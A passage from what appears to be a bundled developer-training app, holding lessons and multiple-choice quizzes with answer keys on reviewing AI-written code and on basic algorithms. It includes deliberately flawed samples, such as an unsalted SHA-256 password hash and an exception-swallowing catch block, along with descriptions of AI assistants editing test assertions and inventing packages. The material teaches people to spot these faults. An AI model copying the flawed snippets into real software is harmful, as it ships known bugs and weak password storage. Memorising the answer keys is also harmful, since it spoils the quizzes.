public void CalculateShipping_Works()
{
    var order = TestData.Order(weightKg: 12);
    var service = new ShippingService();

    var ex = Record.Exception(() => service.CalculateShipping(order));

    Assert.Null(ex);
}`},choices:["Nothing — a passing test means the code is correct","`Record.Exception` does not exist in xUnit","It only checks that nothing throws, not the shipping cost","Test method names must start with `Test`"],answer:2,why:'A wrong shipping price would still pass. Assert the actual result for known inputs, for example "12 kg → 15.00".',remember:'"Does not throw" is not a real assertion.'},{id:"ai.testing.2",kind:"scenario",difficulty:"medium",prompt:'Three tests fail. You ask the AI to "make the tests pass". Its diff changes `Assert.Equal(90m, total)` to `Assert.Equal(100m, total)`. What happened?',choices:["The AI found and fixed the bug in the code","The AI hid the bug by changing what the test expects","The old test was surely wrong, so this is fine","Nothing important — it is only a test file"],answer:1,why:"The goal was correct code, not green tests. Check what the requirement says. If 90 is right, the code must change, not the test.",remember:"Watch for diffs that edit assertions."},{id:"ai.testing.3",kind:"code",difficulty:"hard",prompt:"The VAT rate should be 8%, but the code uses 10%. Why does this AI-generated test still pass?",code:{lang:"ts",text:`// Code under test
export const vat = (net: number) => net * 0.1;

// AI-generated test
it('calculates VAT', () => {
  const net = 250;
  expect(vat(net)).toBe(net * 0.1);
});`},choices:["`toBe` ignores small number differences","The test runner caches results from older runs","Number tests are skipped unless marked as async","The expected value uses the same wrong formula as the code"],answer:3,why:"The test repeats the implementation, so it repeats the bug. Use a known value from the requirement: `expect(vat(250)).toBe(20)`.",remember:"Expected values come from the requirement, not the code."},{id:"ai.testing.4",kind:"scenario",difficulty:"medium",prompt:"How can you quickly check whether AI-written tests really protect a method?",choices:["Break the code on purpose and see if a test fails","Check that line coverage for the method is 100%","Count the tests — more than 10 is usually enough","Ask the AI to rate the quality of its own tests"],answer:0,why:"Coverage only shows which lines ran, not whether anything was checked. If a bug you add on purpose does not turn a test red, the tests are weak."}]},{id:"ai.hallucinations",title:"Spot hallucinations",summary:"Confident, fluent — and invented.",minutes:4,blocks:[{type:"text",text:"A **hallucination** is when the AI states something false with full confidence. It predicts text that **looks** right. It does not check a source."},{type:"list",items:["**Invented APIs** — a method, overload or option that does not exist.","**Invented packages** — a NuGet or npm name that sounds real but is not.","**Invented config keys** — settings nothing reads, so they silently do nothing.","**Wrong version** — behavior from an older or newer version than yours.","**Wrong explanations** — a convincing reason for a bug that is not the real cause."]},{type:"code",code:{lang:"csharp",text:`// AI suggestion
services.AddDbContextPool<AppDbContext>(o =>
    o.UseSqlServer(conn)
     .EnableSmartQueryCache(true)); // ← does this exist?`}},{type:"diagram",text:`AI says "X exists"
        ↓
Does it compile? ──── no ───► invented
        ↓ yes
In the official docs for YOUR version?
        ↓ yes
Does a test show it changes behavior?
        ↓ yes
   OK to use ✅`},{type:"example",title:"Invented packages are a security risk",text:"The AI suggests a package with a nice name you have never seen. It may not exist. Or someone may have published it on purpose. Attackers register package names that AI assistants often invent. This attack is sometimes called **slopsquatting**. Before installing, check the publisher, age, downloads and source repository."},{type:"text",text:"Config keys are tricky. In `appsettings.json`, a key that nothing reads is simply ignored — no error, no effect."}],remember:"Trust the compiler and the official docs, not the confident tone.",questions:[{id:"ai.hallucinations.1",kind:"scenario",difficulty:"medium",prompt:"The AI suggests `services.AddDbContextPool(...)` with an option `.EnableSmartQueryCache(true)`. You cannot find it in the EF Core docs. What do you do?",choices:["Keep it — the AI probably knows an undocumented feature","Assume it may be invented: check compiler and docs, drop it if missing","Search NuGet for any package that adds a method with that name",'Ask the AI "are you sure?" and go with whatever it answers'],answer:1,why:"If it is not in the docs for your version and does not compile, it does not exist. Asking the AI again often gets a second confident answer, not proof.",remember:"Not in the docs + does not compile = invented."},{id:"ai.hallucinations.2",kind:"scenario",difficulty:"hard",prompt:"The AI tells you to `npm install` a package. On the registry it was published 3 weeks ago, has almost no downloads and no linked repository. What is the main risk?",choices:["The package may be slower than a popular one","npm will refuse to install such a new package","It will make the bundle size a little larger","It may be malicious, registered for a name AIs invent"],answer:3,why:"Attackers publish packages under names that AI assistants often invent. Installing can run their code (install scripts) on your machine and in your build. Check publisher, age, downloads and source first.",remember:"Unknown package from AI → verify before install."},{id:"ai.hallucinations.3",kind:"debug",difficulty:"medium",prompt:'You added a setting the AI suggested to `appsettings.json`: `"Kestrel": { "EnableTurboMode": true }`. No error at startup, but nothing changes. What is the most likely reason?',choices:["JSON booleans must be written as strings in appsettings","Kestrel settings are only read in the Production environment","The key does not exist, and unread config keys are just ignored","The app must be restarted twice to load new settings"],answer:2,why:"By default, configuration keys that no code reads are ignored. A hallucinated flag fails silently. Check the documented options for your version."},{id:"ai.hallucinations.4",kind:"scenario",difficulty:"medium",prompt:'The AI explains: "This deadlock happens because async methods always run on a new thread." It sounds smart. What is the right reaction?',choices:["Treat it as a guess and check it against docs or a small test","Accept it — the explanation is detailed and sounds expert","Stop using AI for any explanation from now on","Ask two other AI tools and take the majority answer"],answer:0,why:"A fluent explanation is not proof. This one is actually false: async methods do not always run on a new thread. Check any claim before you base your fix on it."},{id:"ai.hallucinations.5",kind:"truefalse",difficulty:"easy",prompt:"If AI-generated code compiles, it cannot contain a hallucination.",choices:["True","False"],answer:1,why:"Compiling only proves the names exist. The AI can still use an API the wrong way, or use behavior from another version. It can also add a config key that nothing reads."}]},{id:"ai.debug-refactor-perf",title:"Debugging, refactoring and performance",summary:"Hypotheses, small steps, real measurements.",minutes:5,blocks:[{type:"text",text:"**Debugging.** Give the AI evidence, not a feeling. Share the full stack trace, logs around the error, the input, and **what changed** (deploy, config, data). Ask for **hypotheses** (possible causes) **ranked by evidence**, and how to confirm each one. Do not ask for a blind fix, that is, a fix made without knowing the cause."},{type:"example",title:"Good debugging prompt",text:`After today's deploy, \`POST /orders\` returns 500 for about 5% of requests.
Stack trace: (full trace)
Logs around the error: (lines)
Changed in this deploy: new discount rule, EF Core patch upgrade.
Give 3 hypotheses ranked by how well they fit this evidence, and how to confirm each. No fix yet.`},{type:"compare",left:{title:"Blind fix ⚠️",items:["Wrap it in try/catch and ignore","Add a null check where it crashed","Error disappears, bug stays"]},right:{title:"Root cause ✅",items:["Why is it null?","Which change made it null?","Fix the cause, add a test that reproduces it"]}},{type:"text",text:'**Refactoring** means changing the structure **without changing behavior**. With AI: tests first, then small steps, run tests after each step. Never mix "refactor" and "fix a bug" in one change.'},{type:"diagram",text:`Refactor loop with AI
 ┌──► tests green?
 │        ↓ yes
 │    AI makes ONE small change
 │        ↓
 │    review diff + run tests
 └────────┘`},{type:"text",text:'**Performance.** Give the AI real data: the execution plan, profiler output, timings. It can explain an execution plan and suggest ideas. But **you measure before and after**. "This will be 3× faster" from an AI is a guess, not a result.'}],remember:"Debug: hypotheses, not blind fixes. Refactor: same behavior, small steps. Perf: measure yourself.",questions:[{id:"ai.debug-refactor-perf.1",kind:"debug",difficulty:"medium",prompt:'Users report missing invoices. Logs showed a `NullReferenceException` in `SendInvoice`. The AI "fixed" it like this. What is the problem?',code:{lang:"csharp",text:`try
{
    await invoiceService.SendInvoice(order);
}
catch (Exception)
{
    // ignore
}`},choices:["Nothing — the crash is gone, so it is fixed","It should catch `NullReferenceException`, not `Exception`","try/catch blocks are too slow to use in C#","The failure is now hidden: invoices still fail, with no log"],answer:3,why:'Ignoring ("swallowing") the exception hides the symptom, not the cause. Find out why something is null and fix that. Let real failures get logged.',remember:"Empty catch = hidden bug."},{id:"ai.debug-refactor-perf.2",kind:"scenario",difficulty:"hard",prompt:'You ask the AI to split a 600-line `PriceCalculator` into smaller classes. The diff also "fixes" a rounding rule along the way. All tests pass. What is the problem?',choices:["None — the code is cleaner and the tests pass","Refactors should never create new classes","A behavior change is hidden in a refactor; prices may differ now","Rounding rules should live in the database instead"],answer:2,why:"A refactor must not change behavior. A rounding change is a separate, reviewed change — maybe a business decision. Green tests only mean no test covered that case.",remember:"Refactor and behavior change: never in the same diff."},{id:"ai.debug-refactor-perf.3",kind:"scenario",difficulty:"medium",prompt:"You want the AI to refactor legacy code that has no tests. What should you do first?",choices:["Add tests that lock in what the code does today","Delete the old code and ask the AI for a rewrite","Refactor everything in one big step to save time","Turn off compiler warnings so the diff is cleaner"],answer:0,why:"Tests that record what the code does today are called characterization tests. They protect you. Then you can check each small refactor step against them."},{id:"ai.debug-refactor-perf.4",kind:"perf",difficulty:"hard",prompt:'You give the AI the execution plan of a slow query. It says: "Add this index and the query will be 10× faster." What is the right next step?',choices:["Create the index in production right away","Try it on realistic data and compare plan and reads before/after","Add a few more indexes on other columns to be safe","Ask the AI to double-check its 10× estimate"],answer:1,why:"The AI cannot run your query on your data. Measure the plan, logical reads and timing. Also remember: a new index makes every write a little slower.",remember:"AI estimates are guesses. Measurements are facts."}]},{id:"ai.trust",title:"When NOT to trust AI",summary:"Know where the AI is weakest.",minutes:4,blocks:[{type:"text",text:"The AI is great for boilerplate, explaining code, first drafts and ideas. Be extra careful where a mistake is expensive, or where the AI simply cannot know the answer."},{type:"list",items:["**Security-sensitive code** — auth, password hashing, crypto, permissions. Use proven libraries and get a human review.","**Secrets in prompts** — never paste passwords, keys, tokens or customer personal data.","**Business rules** — tax, refunds, discounts, legal limits. The AI knows typical rules, not yours.","**Recent versions** — training has a cutoff date. New releases and breaking changes may be missing.","**Licensing** — a long code block may be a near copy of licensed code. Follow your company policy.",'**Numbers without a source** — "40% faster", "used by 90% of teams". Ask for a source or measure.']},{type:"code",code:{lang:"csharp",text:`// AI: "Here is a simple way to store passwords."
public static string HashPassword(string password)
{
    using var sha = SHA256.Create();
    var bytes = sha.ComputeHash(Encoding.UTF8.GetBytes(password));
    return Convert.ToBase64String(bytes);
}`}},{type:"compare",left:{title:"Good uses ✅",items:["Boilerplate and mapping code","Explaining unfamiliar code","First drafts of tests","Ideas and hypotheses"]},right:{title:"Extra caution ⚠️",items:["Auth, crypto, permissions","Money, tax and legal rules","Anything with secrets or personal data",'"Latest version" questions']}},{type:"example",title:"A simple test",text:'Ask yourself: "If this is wrong, who gets hurt? Would I notice?" The worse the answer, the more you must check it yourself.'}],remember:"The AI does not know your business, your secrets policy or last month's release. You do.",questions:[{id:"ai.trust.1",kind:"code",difficulty:"hard",prompt:"The AI wrote this method for storing user passwords. What is the main problem?",code:{lang:"csharp",text:`public static string HashPassword(string password)
{
    using var sha = SHA256.Create();
    var bytes = sha.ComputeHash(Encoding.UTF8.GetBytes(password));
    return Convert.ToBase64String(bytes);
}`},choices:["SHA-256 output is too long for a database column","Base64 output should be hex for passwords","It is fast and unsalted — use a slow, salted password hasher","`Encoding.UTF8` cannot handle non-English passwords"],answer:2,why:"A fast, unsalted hash lets attackers try billions of guesses and spot users with the same password. Use a proven hasher (PBKDF2, bcrypt, Argon2), for example ASP.NET Core Identity’s `PasswordHasher`.",remember:"Never invent your own password storage."},{id:"ai.trust.2",kind:"scenario",difficulty:"hard",prompt:"To debug a login problem, a teammate pasted `appsettings.Production.json` into an AI prompt. It contains the real database password. What should happen next?",choices:["Treat it as leaked: rotate the password, use placeholders next time","Nothing — prompts are private and deleted right after the answer","Ask the AI assistant politely to forget the password it saw","Rename the file so it is no longer marked as production"],answer:0,why:"Once a secret leaves your machine, you cannot control where it is stored or logged. Rotating it makes the leaked value useless. Follow your team’s incident process.",remember:"Secret in a prompt = leaked secret."},{id:"ai.trust.3",kind:"scenario",difficulty:"medium",prompt:'The ticket says "VIP customers get a discount". The AI code adds: 10% off, not combined with other promotions, only for orders over 50. What do you do?',choices:["Keep it — these are common rules in many shops","Ask the AI where the rules came from and accept its reason","Remove all discount logic until the next sprint","Confirm the exact rules with the product owner first"],answer:3,why:"The AI filled the gaps with typical rules, not your rules. Percent, combining and minimum amount are business decisions. Confirm them before shipping.",remember:"The AI invents business rules to fill gaps."},{id:"ai.trust.4",kind:"scenario",difficulty:"medium",prompt:"A library released a new major version 2 months ago. You ask the AI how to migrate. What should you keep in mind?",choices:["Its answers are always up to date with the latest release","Its training may be older than the release — check the official guide","It will always refuse to answer questions about new versions","Major versions of popular libraries rarely break anything"],answer:1,why:"The AI may describe the old version or guess the new one. Trust the official release notes and the migration guide instead."}]}],cheatSheet:[{title:"Prompt checklist",items:[{term:"Analyze first",meaning:'"Restate the goal, list unknowns, ask me questions. No code yet."'},{term:"Plan first",meaning:'"Steps, risks, test cases." Then build one step at a time'},{term:"Goal",meaning:"Expected and actual behavior, with a real example"},{term:"Evidence",meaning:"Full error + stack trace + logs + what changed"},{term:"Context",meaning:"Relevant files only, versions, constraints, what you tried"},{term:"Secrets",meaning:"Never in prompts — use `<PLACEHOLDER>`"}]},{title:"Review checklist",items:[{term:"Scope",meaning:"Does exactly what was asked — small task → small diff"},{term:"Edge cases",meaning:"null, empty, zero, huge input, duplicates, time zones"},{term:"Errors",meaning:"No empty `catch`; failures are logged, not hidden"},{term:"Security",meaning:"No SQL from strings, auth checks present, no secrets in code"},{term:"Performance",meaning:"No queries in loops, no whole-table loads, no `.Result`"},{term:"Style",meaning:"Matches the patterns already in the codebase"}]},{title:"Testing AI code",items:[{term:"Run it",meaning:"Reading is not enough — compile and run it"},{term:"Weak test",meaning:'Only "does not throw" / "not null" / `> 0`'},{term:"Mirror test",meaning:"Expected value uses the same formula as the code → bug passes"},{term:"Break it",meaning:"Change the code on purpose — a test must go red"},{term:"Edited assertion",meaning:"AI changed the expected value → the bug was hidden"}]},{title:"Warning signs",items:[{term:"Unknown API / option",meaning:"Not in the docs for your version → likely invented"},{term:"Unknown package",meaning:"New, few downloads, no repo → possible malicious look-alike"},{term:"Config key with no effect",meaning:"Unread keys are ignored silently → check the docs"},{term:'"X× faster"',meaning:"A guess until you measure it yourself"},{term:"Business rule appeared",meaning:"The AI filled a gap → confirm with a human"},{term:"Refactor + fix in one diff",meaning:"Hidden behavior change → split it"}]}]},h=Object.freeze(Object.defineProperty({__proto__:null,default:r},Symbol.toStringTag,{value:"Module"})),c={id:"algorithms",title:"Algorithms",emoji:"🧮",tagline:"Search, sort, recurse — the patterns behind fast code",lessons:[{id:"algorithms.binary-search",title:"Linear search vs binary search",summary:"Check one by one, or cut the data in half each step.",minutes:4,blocks:[{type:"text",text:"To find a value, **linear search** checks the items one by one from the start. It works on any data. The cost is **O(n)**: twice the items, twice the work."},{type:"text",text:"**Binary search** needs data **sorted** by the key you search for. It looks at the middle item. Then it throws away the half that cannot hold the target. The cost is **O(log n)**."},{type:"diagram",text:`find 50 in a sorted array (8 items)

index:  0   1   2   3   4   5   6   7
      ┌───┬───┬───┬───┬───┬───┬───┬───┐
      │ 3 │ 8 │12 │21 │30 │41 │50 │62 │
      └───┴───┴───┴───┴───┴───┴───┴───┘
step 1  L           M               H
        a[3]=21 < 50 → L = M + 1
step 2                  L   M       H
        a[5]=41 < 50 → L = M + 1
step 3                          M   H
                                L
        a[6]=50 → found in 3 steps

L = lo, M = mid, H = hi (indexes)
linear search needs 7 checks here`},{type:"text",text:"Three indexes do the work. `lo` is the first index that may still hold the target. `hi` is the last one. `mid` is the middle between them."},{type:"code",code:{lang:"ts",text:`function binarySearch(a: number[], x: number) {
  let lo = 0;
  let hi = a.length - 1;        // last index
  while (lo <= hi) {            // <= not <
    const mid = lo + Math.floor((hi - lo) / 2);
    if (a[mid] === x) return mid;
    if (a[mid] < x) lo = mid + 1;  // go right
    else hi = mid - 1;             // go left
  }
  return -1;                    // not found
}`}},{type:"list",items:["**Off-by-one** (one step too many or too few): with `hi = length - 1`, the loop must be `while (lo <= hi)`. With `<`, the last candidate is never checked.","**Endless loop**: write `lo = mid + 1` and `hi = mid - 1`. With `lo = mid`, the range can stop shrinking.","**Overflow**: in C#, `(lo + hi) / 2` can go past `int.MaxValue` on huge arrays. `lo + (hi - lo) / 2` is safe.","**Wrong order**: if the data is not sorted by the search key, you get wrong answers. There is no error."]},{type:"code",code:{lang:"csharp",text:`int[] prices = { 3, 8, 12, 21, 30, 41, 50, 62 };
int i = Array.BinarySearch(prices, 50);  // 6
int j = Array.BinarySearch(prices, 40);  // < 0
// negative = not found; ~j = where 40 would go`}},{type:"example",title:"Log search",text:"A server log has 10 million lines, sorted by time. You need the first line at 10:00. Linear search may read millions of lines. Binary search needs about 24 checks."}],remember:"Binary search: sorted data, check the middle, drop half. Use `lo <= hi` and `mid ± 1`.",questions:[{id:"algorithms.binary-search.1",kind:"code",difficulty:"medium",prompt:"This search returns -1 for `find([5], 5)`. Why?",code:{lang:"ts",text:`function find(a: number[], x: number) {
  let lo = 0, hi = a.length - 1;
  while (lo < hi) {
    const mid = lo + Math.floor((hi - lo) / 2);
    if (a[mid] === x) return mid;
    if (a[mid] < x) lo = mid + 1;
    else hi = mid - 1;
  }
  return -1;
}`},choices:["`lo < hi` is false with one item, so the loop never runs","`mid` is computed wrongly when the array has one item","`lo` should start at 1, because index 0 is skipped","`===` does not work when comparing two numbers"],answer:0,why:"With one item, `lo` and `hi` are both 0. `0 < 0` is false, so the loop never runs. Use `lo <= hi` when `hi` is the last index.",remember:"`hi = length - 1` goes with `while (lo <= hi)`."},{id:"algorithms.binary-search.2",kind:"mcq",difficulty:"easy",prompt:"A sorted array has 1,000,000 items. In the worst case, about how many checks does binary search need?",choices:["About 20","About 1,000","About 500,000","About 1,000,000"],answer:0,why:"Each check cuts the range in half. 2^20 is about 1 million, so about 20 halvings leave one item."},{id:"algorithms.binary-search.3",kind:"scenario",difficulty:"medium",prompt:"You get an **unsorted** list of 5,000 orders. You must find one order by id, just once. What is the best plan?",choices:["Sort the list first, then use binary search","Linear search: check each order one time","Copy the list into a sorted tree, then search it","Run binary search directly on the unsorted list"],answer:1,why:"Sorting costs O(n log n), which is more than one O(n) scan. Sorting pays off only when you search the same data many times.",remember:"One search on unsorted data → just scan it."},{id:"algorithms.binary-search.4",kind:"debug",difficulty:"hard",prompt:"A binary search sometimes never returns, and the CPU stays at 100%. You find these lines. What is wrong?",code:{lang:"ts",text:`if (a[mid] < x) lo = mid;
else hi = mid - 1;`},choices:["When `hi = lo + 1`, `mid` equals `lo`, so the range stops shrinking","The `else` branch moves `hi` too far and skips the target","`a[mid] < x` must be `a[mid] <= x` to find the target","The loop needs a `break` right after `hi = mid - 1`"],answer:0,why:"With `lo = 3` and `hi = 4`, `mid` is 3. If `a[3] < x`, `lo` stays 3 forever. Use `lo = mid + 1`, because `mid` was already checked."}]},{id:"algorithms.sorting",title:"How sorting works",summary:"Insertion, merge and quick sort — and the traps in real code.",minutes:5,blocks:[{type:"list",items:["**Insertion sort**: take the next item and slide it left into the sorted part. It is like sorting cards in your hand.","**Bubble sort**: swap neighbours that are in the wrong order, and repeat. Both simple sorts are **O(n²)**.","**Merge sort**: split the list in half until each part has one item. Then **merge** the sorted parts. Always **O(n log n)**, but needs extra memory.","**Quick sort**: pick one item as the **pivot**. Move smaller items left of it and bigger ones right of it. Repeat on each side.","Quick sort is **O(n log n)** on average. If the pivot is the smallest or largest item every time, it becomes **O(n²)**."]},{type:"diagram",text:`insertion sort  (| = end of sorted part)

[5 | 2 4 1]   start: 5 alone is sorted
[2 5 | 4 1]   2 slides left of 5
[2 4 5 | 1]   4 slides between 2 and 5
[1 2 4 5 |]   1 slides to the front`},{type:"diagram",text:`merge sort: split down, merge up

         [8 3 5 1]
         ╱       ╲
     [8 3]       [5 1]
     ╱   ╲       ╱   ╲
   [8]   [3]   [5]   [1]
     ╲   ╱       ╲   ╱
     [3 8]       [1 5]
         ╲       ╱
         [1 3 5 8]

merge: compare the two fronts,
take the smaller one, repeat
[3 8] + [1 5] → 1
[3 8] + [5]   → 1 3
[8]   + [5]   → 1 3 5
[8]   + []    → 1 3 5 8`},{type:"diagram",text:`quick sort: split around a pivot

[7 2 9 5 1 8 3]      pivot = 5
        ↓  partition
[2 1 3]  5  [7 9 8]
smaller     bigger
   ↓           ↓     repeat on each side
[1 2 3]  5  [7 8 9]`},{type:"text",text:"A **stable** sort keeps items with equal keys in their original order. In C#, LINQ `OrderBy` is stable. `List<T>.Sort` and `Array.Sort` are not. In JavaScript, `Array.prototype.sort` is stable since ES2019."},{type:"text",text:"In real code, use the built-in sort. It is fast and well tested. Your job is the **comparator**: the function that says which of two items comes first."},{type:"code",code:{lang:"ts",text:`const nums = [10, 9, 1, 100];

nums.sort();
// [1, 10, 100, 9]  compared as strings!

nums.sort((a, b) => a - b);
// [1, 9, 10, 100]  numbers, small to big`}},{type:"code",code:{lang:"csharp",text:`// LINQ OrderBy is stable
var sorted = orders
    .OrderBy(o => o.Status)
    .ThenBy(o => o.CreatedAt)
    .ToList();

// Comparator: use CompareTo, not a - b
// (a - b can overflow for big ints)
items.Sort((a, b) => a.Score.CompareTo(b.Score));`}},{type:"example",title:"Leaderboard",text:"A game lists players by score. The list already shows who reached each score first. A stable sort by score keeps that order for tied players. An unstable sort may mix tied players up."}],remember:"Use the built-in sort, but check the comparator. JavaScript `sort()` with no comparator compares strings.",questions:[{id:"algorithms.sorting.1",kind:"code",difficulty:"easy",prompt:"What does this print in JavaScript or TypeScript?",code:{lang:"ts",text:`const a = [10, 1, 5, 100];
a.sort();
console.log(a);`},choices:["[1, 5, 10, 100]","[1, 10, 100, 5]","[100, 10, 5, 1]","[10, 1, 5, 100]"],answer:1,why:'With no comparator, `sort` turns items into strings and compares them as text. "100" comes before "5" because "1" comes before "5". Pass `(a, b) => a - b` for numbers.',remember:"JS `sort()` needs a comparator for numbers."},{id:"algorithms.sorting.2",kind:"scenario",difficulty:"medium",prompt:"Orders are already sorted by date. You now sort them by status. Orders with the same status must stay in date order. In C#, what should you use?",choices:["LINQ `OrderBy`, because it is a stable sort","`List<T>.Sort`, because it sorts in place","Any sort, since all sorts keep ties in order","Quick sort, because it is the fastest choice"],answer:0,why:"`OrderBy` is stable, so equal keys keep their input order. `List<T>.Sort` is not stable, so tied orders may swap. Adding `.ThenBy(o => o.CreatedAt)` makes it explicit."},{id:"algorithms.sorting.3",kind:"perf",difficulty:"medium",prompt:"An import job uses a hand-written bubble sort on 200,000 rows. It takes many minutes. What is the best fix?",choices:["Use the built-in sort, which is O(n log n)","Run the same bubble sort on a bigger server","Stop early when two neighbours are equal","Sort the rows twice in two parallel threads"],answer:0,why:"Bubble sort is O(n²): tens of billions of compares for 200,000 rows. The built-in sort needs only a few million.",remember:"O(n²) sorts are for tiny lists only."},{id:"algorithms.sorting.4",kind:"debug",difficulty:"hard",prompt:"Scores can be any `int`, even very large or very negative. Some lists come out in the wrong order. Why?",code:{lang:"csharp",text:"players.Sort((a, b) => a.Score - b.Score);"},choices:["`a.Score - b.Score` can overflow and flip its sign","`List<T>.Sort` can only sort numbers, not objects","A comparator must return only -1, 0 or 1","`Sort` must be called on a copy made by `ToList()`"],answer:0,why:"For example, `int.MaxValue - (-1)` wraps around to a negative number. The sort then thinks the bigger score is smaller. Use `a.Score.CompareTo(b.Score)`."},{id:"algorithms.sorting.5",kind:"truefalse",difficulty:"medium",prompt:"Quick sort always runs in O(n log n) time.",choices:["True","False"],answer:1,why:"Its average is O(n log n). If the pivot is the smallest or largest item every time, it becomes O(n²). Library sorts add guards to avoid this."}]},{id:"algorithms.recursion",title:"Recursion",summary:"A function that calls itself on a smaller problem.",minutes:4,blocks:[{type:"text",text:"**Recursion** means a function calls itself. Every recursive function needs two parts. The **base case** stops it. The **recursive step** calls itself with a smaller input."},{type:"code",code:{lang:"ts",text:`function factorial(n: number): number {
  if (n <= 1) return 1;          // base case
  return n * factorial(n - 1);   // smaller step
}
factorial(3); // 3 × 2 × 1 = 6`}},{type:"diagram",text:`call stack for factorial(3)

calls go down, the top one runs:
┌───────────────────┐
│ factorial(1) = 1  │ ← base case, returns
├───────────────────┤
│ factorial(2)      │ waits for (1)
├───────────────────┤
│ factorial(3)      │ waits for (2)
└───────────────────┘

answers go back up:
factorial(1) = 1
factorial(2) = 2 × 1 = 2
factorial(3) = 3 × 2 = 6`},{type:"text",text:"Each call gets a **frame** on the **call stack**. A frame holds the local variables and where to return. The stack has a fixed size. Too many calls in a row cause a **stack overflow**."},{type:"text",text:"In .NET, a stack overflow ends the whole process, and you cannot catch it. In JavaScript you get `RangeError: Maximum call stack size exceeded`."},{type:"code",code:{lang:"csharp",text:`long FolderSize(DirectoryInfo dir)
{
    long total = 0;
    foreach (var f in dir.GetFiles())
        total += f.Length;
    // base case: no subfolders → loop is empty
    foreach (var sub in dir.GetDirectories())
        total += FolderSize(sub);  // smaller step
    return total;
}`}},{type:"compare",left:{title:"Recursion fits",items:["Tree-shaped data: folders, menus, JSON","Split-in-half work, like merge sort","Depth stays small, like tens or hundreds"]},right:{title:"A loop fits",items:["Walking a list or counting","Depth can be huge, like 100,000+","Hot code where every call costs time"]}},{type:"example",title:"The menu that crashed",text:"A shop menu shows categories inside categories with a recursive function. Someone set a category as its own parent by mistake. The function never reached a base case. The site crashed with a stack overflow. A depth limit or a visited set prevents this."}],remember:"Recursion = base case + smaller step. Deep data → use a loop.",questions:[{id:"algorithms.recursion.1",kind:"debug",difficulty:"easy",prompt:'`sumTo(0)` crashes with "Maximum call stack size exceeded". Why?',code:{lang:"ts",text:`function sumTo(n: number): number {
  if (n === 1) return 1;
  return n + sumTo(n - 1);
}
sumTo(0);`},choices:["n goes 0, -1, -2... and never hits the base case","JavaScript does not let a function call itself","The sum gets too big and the number overflows","The result must be stored in a variable first"],answer:0,why:"The base case only matches `n === 1`. Starting at 0, n only gets smaller, so it never stops. Use `if (n <= 1)` instead.",remember:"Check that every input reaches the base case."},{id:"algorithms.recursion.2",kind:"code",difficulty:"medium",prompt:"What does this print?",code:{lang:"ts",text:`function f(n: number): void {
  if (n === 0) return;
  f(n - 1);
  console.log(n);
}
f(3);`},choices:["3 2 1","1 2 3","0 1 2 3","Nothing"],answer:1,why:"`f(3)` first calls `f(2)`, which calls `f(1)`, which calls `f(0)`. Each call prints only after its inner call returns. So `f(1)` prints first."},{id:"algorithms.recursion.3",kind:"scenario",difficulty:"medium",prompt:"Your code walks a linked list with recursion: each node points to the next one. With 1 million nodes it crashes with a stack overflow. What is the best fix?",choices:['Rewrite it as a loop with a "current node" variable',"Catch the stack overflow and run the walk again","Check for `node == null` at the top of the function","Run the walk on a background thread instead"],answer:0,why:"Recursion uses one stack frame per node, so 1 million nodes means 1 million frames. A loop uses the same few variables for every node."},{id:"algorithms.recursion.4",kind:"truefalse",difficulty:"hard",prompt:"In .NET, you can catch a `StackOverflowException` and keep the app running.",choices:["True","False"],answer:1,why:"Since .NET 2.0, a stack overflow ends the whole process. A `catch` block does not help. Prevent it: limit the depth or use a loop."}]},{id:"algorithms.two-pointers",title:"Two pointers and sliding window",summary:"Walk the array once instead of checking every pair.",minutes:5,blocks:[{type:"text",text:'**Two pointers** are two indexes that move through an array. They move toward each other, or in the same direction. This can turn an O(n²) "check every pair" loop into one O(n) pass.'},{type:"diagram",text:`sorted; find two numbers with sum 14
sum < 14 → move L right (need bigger)
sum > 14 → move R left  (need smaller)

  0   1   2   3   4   5
┌───┬───┬───┬───┬───┬───┐
│ 1 │ 3 │ 5 │ 8 │ 9 │12 │
└───┴───┴───┴───┴───┴───┘
  L                   R   1+12=13 → L++
      L               R   3+12=15 → R--
      L           R       3+9=12  → L++
          L       R       5+9=14  found`},{type:"code",code:{lang:"ts",text:`function pairSum(a: number[], target: number) {
  let l = 0, r = a.length - 1;
  while (l < r) {
    const sum = a[l] + a[r];
    if (sum === target) return [l, r];
    if (sum < target) l++;   // need bigger
    else r--;                // need smaller
  }
  return null;
}`}},{type:"text",text:"A **sliding window** is a range of items next to each other. Move its end to add an item. Move its start to drop one. Keep a running total instead of adding everything again."},{type:"diagram",text:`max sum of 3 items in a row

[2  1  5  1  3  2]
 └─────┘           2+1+5     = 8
    └─────┘        8 - 2 + 1 = 7
       └─────┘     7 - 1 + 3 = 9  ← max
          └─────┘  9 - 5 + 2 = 6

add the new item, remove the old one
→ one pass: O(n), not O(n × k)`},{type:"diagram",text:`longest part with no repeated letter

 a  b  c  a  b  b
[a  b  c]           length 3
   [b  c  a]        a again → start + 1
      [c  a  b]     b again → start + 1
               [b]  b again → jump start
best = 3`},{type:"code",code:{lang:"csharp",text:`int LongestUnique(string s)
{
    var last = new Dictionary<char, int>();
    int start = 0, best = 0;
    for (int end = 0; end < s.Length; end++)
    {
        if (last.TryGetValue(s[end], out var i)
            && i >= start)
            start = i + 1;   // skip past the repeat
        last[s[end]] = end;
        best = Math.Max(best, end - start + 1);
    }
    return best;
}`}},{type:"example",title:"Best sales week",text:"A shop dashboard shows the best 7-day sales total of the year. Adding 7 days again for each day is slow on big data. A sliding window adds today and drops the day that left the window."}],remember:"Sorted pairs → two pointers. Ranges of items in a row → sliding window.",questions:[{id:"algorithms.two-pointers.1",kind:"scenario",difficulty:"easy",prompt:"A **sorted** array has 1 million prices. You need two prices that add up to exactly 500. Which approach is best?",choices:["Two nested loops that check every pair","Two pointers from both ends, moving inward","Sort the array again, then check each pair","Binary search for 500 in the whole array"],answer:1,why:"Nested loops check about 500 billion pairs. Two pointers walk the array once: O(n). Sorting again is wasted work."},{id:"algorithms.two-pointers.2",kind:"debug",difficulty:"medium",prompt:'A teammate uses the two-pointer pair sum on an **unsorted** list. It sometimes says "not found" when a pair exists. Why?',choices:["Moving L or R is only safe when the data is sorted","Two pointers only work when the array length is even","The loop must be `while (l <= r)`, not `while (l < r)`","The sum overflows when the list is not sorted"],answer:0,why:'In a sorted array, "sum too small" means only moving L right can help. In an unsorted array that rule is false, so the pointers skip valid pairs.',remember:"Two-pointer pair sum needs sorted data."},{id:"algorithms.two-pointers.3",kind:"perf",difficulty:"medium",prompt:"A chart shows the average of each 30-day window over 1 million daily values. The code adds up 30 values for every window. How can you make it faster?",choices:["Keep a running sum: add the new value, drop the old one","Use `double` instead of `decimal` for the values","Sort the values first, then add up each window","Store every 30-value sum in a list to reuse later"],answer:0,why:"Each window shares 29 values with the one before it. A running 